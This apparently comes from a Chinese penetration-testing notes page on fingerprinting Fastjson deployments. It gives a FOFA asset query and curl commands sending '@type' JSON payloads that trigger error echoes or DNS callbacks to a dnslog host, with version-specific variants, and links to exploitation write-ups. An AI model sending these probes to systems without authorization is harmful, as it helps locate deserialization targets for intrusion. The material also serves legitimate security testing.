## 应用简介

Fastjson是阿里巴巴公司开源的一款JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。

它采用一种“假定有序快速匹配”的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。

## 相关资产

FOFA

```http
app="Fastjson"
```

## 识别方法

如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显

```bash
curl http://192.168.2.133:32768/ -H "Content-Type: application/json" --data '{{"@type":"java.net.URL","val":"mx2guq.dnslog.cn"}:0'
```

```bash
#payload
{"a":"
{{"@type":"java.net.URL","val":"dnslog"}:0
```

```
#匹配特征
http.code=500 && "Internal Server Error" in body
```

还可以通过DNS回显的方式检测后端是否使用Fastjson

```bash
curl http://x.x.x.x:8090/ -H "Content-Type: application/json" --data '{{"@type":"java.net.URL","val":"dnslog"}:0'
```

1.2.67版本前

```
{"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}
```

1.2.67版本后payload

```
{"@type":"java.net.Inet4Address","val":"dnslog"}
```

## 环境搭建

https://www.runoob.com/w3cnote/fastjson-intro.html

https://www.cnblogs.com/hei-zi/p/13274272.html

## 不出网利用

[@flashine {fastjson 不出网利用总结}](https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ)